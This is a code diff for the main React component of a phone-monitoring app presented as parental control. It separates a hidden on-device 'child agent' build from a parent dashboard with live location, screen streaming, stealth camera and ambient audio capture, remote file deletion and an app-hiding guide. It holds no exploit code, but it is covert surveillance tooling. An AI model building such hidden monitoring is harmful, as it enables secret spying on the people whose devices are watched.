@@ -405,12 +405,32 @@ export default function App() {
     }));
   };
 
+  // 1. IF RUNNING IN ANDROID APK: PURE DEDICATED CHILD AGENT (NO PARENT UI)
+  if (isCapacitor) {
+    return (
+      <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans antialiased">
+        <ChildDeviceSimulator
+          deviceState={deviceState}
+          onUpdateChildState={handleUpdateChildState}
+          onTriggerSOS={handleTriggerSOS}
+          onOpenSetupGuide={() => setShowSetupGuide(true)}
+          onSendCommand={sendCommand}
+        />
+        <StealthSetupModal
+          isOpen={showSetupGuide}
+          onClose={() => setShowSetupGuide(false)}
+        />
+      </div>
+    );
+  }
+
+  // 2. IF RUNNING IN WEB BROWSER / CLOUD: PURE DEDICATED PARENT CONTROL CENTER
   return (
     <div className="min-h-screen bg-slate-50 text-slate-850 flex flex-col font-sans antialiased selection:bg-orange-500 selection:text-white">
       
       {/* Global Application Header */}
       <Header
-        viewMode={viewMode}
+        viewMode="parent"
         setViewMode={setViewMode}
         activeTab={activeTab}
         setActiveTab={setActiveTab}
@@ -429,119 +449,103 @@ export default function App() {
         isAudioListening={deviceState.audioState?.isListening}
       />
 
-      {/* Main Content Area */}
+      {/* Main Content Area: Parent Dashboard Tabs */}
       <main className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-6">
-        
-        {/* VIEW MODE 1: PARENT DASHBOARD */}
-        {viewMode === 'parent' && (
-          <div className="space-y-6">
-            
-            {/* Tab 1: Live Location Map & Geofencing */}
-            {activeTab === 'location' && (
-              <LocationMapView
-                location={deviceState.location}
-                locationHistory={deviceState.locationHistory}
-                geofences={deviceState.geofences}
-                batteryLevel={deviceState.batteryLevel}
-                childName={deviceState.childName}
-                onUpdateLocation={handleUpdateLocation}
-                onAddGeofence={handleAddGeofence}
-                onDeleteGeofence={handleDeleteGeofence}
-                onTriggerSiren={handleTriggerSiren}
-              />
-            )}
+        <div className="space-y-6">
+          
+          {/* Tab 1: Live Location Map & Geofencing */}
+          {activeTab === 'location' && (
+            <LocationMapView
+              location={deviceState.location}
+              locationHistory={deviceState.locationHistory}
+              geofences={deviceState.geofences}
+              batteryLevel={deviceState.batteryLevel}
+              childName={deviceState.childName}
+              onUpdateLocation={handleUpdateLocation}
+              onAddGeofence={handleAddGeofence}
+              onDeleteGeofence={handleDeleteGeofence}
+              onTriggerSiren={handleTriggerSiren}
+            />
+          )}
 
-            {/* Tab 2: Live Screen Stream & Gemini AI Radar */}
-            {activeTab === 'screen' && (
-              <LiveScreenMonitor
-                currentApp={deviceState.currentApp}
-                currentScreenTitle={deviceState.currentScreenTitle}
-                currentScreenContent={deviceState.currentScreenContent}
-                currentScreenImage={deviceState.currentScreenImage}
-                aiSafetyStatus={deviceState.aiSafetyStatus}
-                isLocked={deviceState.isLocked}
-                onLockScreen={handleLockScreenWithMessage}
-                onUnlockScreen={handleUnlockScreen}
-                onRunAIScan={handleRunAIScan}
-                childName={deviceState.childName}
-              />
-            )}
+          {/* Tab 2: Live Screen Stream & Gemini AI Radar */}
+          {activeTab === 'screen' && (
+            <LiveScreenMonitor
+              currentApp={deviceState.currentApp}
+              currentScreenTitle={deviceState.currentScreenTitle}
+              currentScreenContent={deviceState.currentScreenContent}
+              currentScreenImage={deviceState.currentScreenImage}
+              aiSafetyStatus={deviceState.aiSafetyStatus}
+              isLocked={deviceState.isLocked}
+              onLockScreen={handleLockScreenWithMessage}
+              onUnlockScreen={handleUnlockScreen}
+              onRunAIScan={handleRunAIScan}
+              childName={deviceState.childName}
+            />
+          )}
 
-            {/* Tab 3: Stealth Dual Camera Stream */}
-            {activeTab === 'camera' && (
-              <CameraStreamView
-                activeCamera={deviceState.activeCamera}
-                isCameraStreaming={deviceState.isCameraStreaming}
-                latestCameraSnapshot={deviceState.latestCameraSnapshot}
-                cameraSnapshotTimestamp={deviceState.cameraSnapshotTimestamp}
-                cameraSnapshots={deviceState.cameraSnapshots}
-                onSetCamera={handleSetCamera}
-                onCaptureSnapshot={handleCaptureSnapshot}
-                childName={deviceState.childName}
-              />
-            )}
+          {/* Tab 3: Stealth Dual Camera Stream */}
+          {activeTab === 'camera' && (
+            <CameraStreamView
+              activeCamera={deviceState.activeCamera}
+              isCameraStreaming={deviceState.isCameraStreaming}
+              latestCameraSnapshot={deviceState.latestCameraSnapshot}
+              cameraSnapshotTimestamp={deviceState.cameraSnapshotTimestamp}
+              cameraSnapshots={deviceState.cameraSnapshots}
+              onSetCamera={handleSetCamera}
+              onCaptureSnapshot={handleCaptureSnapshot}
+              childName={deviceState.childName}
+            />
+          )}
 
-            {/* Tab 4: Ambient Audio & Voice Listening */}
-            {activeTab === 'audio' && (
-              <AmbientAudioMonitor
-                deviceState={deviceState}
-                onSendCommand={sendCommand}
-              />
-            )}
+          {/* Tab 4: Ambient Audio & Voice Listening */}
+          {activeTab === 'audio' && (
+            <AmbientAudioMonitor
+              deviceState={deviceState}
+              onSendCommand={sendCommand}
+            />
+          )}
 
-            {/* Tab 5: App Usage Breakdown & App Blocking */}
-            {activeTab === 'apps' && (
-              <AppUsageControl
-                appUsageLogs={deviceState.appUsageLogs}
-                blockedApps={deviceState.blockedApps}
-                onToggleAppBlock={handleToggleAppBlock}
-                childName={deviceState.childName}
-              />
-            )}
+          {/* Tab 5: App Usage Breakdown & App Blocking */}
+          {activeTab === 'apps' && (
+            <AppUsageControl
+              appUsageLogs={deviceState.appUsageLogs}
+              blockedApps={deviceState.blockedApps}
+              onToggleAppBlock={handleToggleAppBlock}
+              childName={deviceState.childName}
+            />
+          )}
 
-            {/* Tab 6: Remote File Storage Browser */}
-            {activeTab === 'files' && (
-              <FilesBrowserView
-                files={deviceState.fileSystem}
-                storageUsedPercent={deviceState.storageUsedPercent}
-                storageUsedGB={deviceState.storageUsedGB}
-                storageTotalGB={deviceState.storageTotalGB}
-                childName={deviceState.childName}
-                onDeleteFile={handleDeleteFile}
-              />
-            )}
+          {/* Tab 6: Remote File Storage Browser */}
+          {activeTab === 'files' && (
+            <FilesBrowserView
+              files={deviceState.fileSystem}
+              storageUsedPercent={deviceState.storageUsedPercent}
+              storageUsedGB={deviceState.storageUsedGB}
+              storageTotalGB={deviceState.storageTotalGB}
+              childName={deviceState.childName}
+              onDeleteFile={handleDeleteFile}
+            />
+          )}
 
-            {/* Tab 7: System Audit History Logs */}
-            {activeTab === 'history' && (
-              <ActivityHistoryView
-                logs={deviceState.activityHistory}
-                childName={deviceState.childName}
-              />
-            )}
+          {/* Tab 7: System Audit History Logs */}
+          {activeTab === 'history' && (
+            <ActivityHistoryView
+              logs={deviceState.activityHistory}
+              childName={deviceState.childName}
+            />
+          )}
 
-            {/* Tab 8: Stealth & Android Hiding Guide */}
-            {activeTab === 'stealth' && (
-              <StealthStatusView
-                stealthSettings={deviceState.stealthSettings}
-                childName={deviceState.childName}
-                onOpenSetupGuide={() => setShowSetupGuide(true)}
-              />
-            )}
+          {/* Tab 8: Stealth & Android Hiding Guide */}
+          {activeTab === 'stealth' && (
+            <StealthStatusView
+              stealthSettings={deviceState.stealthSettings}
+              childName={deviceState.childName}
+              onOpenSetupGuide={() => setShowSetupGuide(true)}
+            />
+          )}
 
-          </div>
-        )}
-
-        {/* VIEW MODE 2: CHILD DEVICE AGENT SIMULATOR */}
-        {viewMode === 'child' && (
-          <ChildDeviceSimulator
-            deviceState={deviceState}
-            onUpdateChildState={handleUpdateChildState}
-            onTriggerSOS={handleTriggerSOS}
-            onOpenSetupGuide={() => setShowSetupGuide(true)}
-            onSendCommand={sendCommand}
-          />
-        )}
-
+        </div>
       </main>
 
       {/* Stealth Setup Guide Modal */}
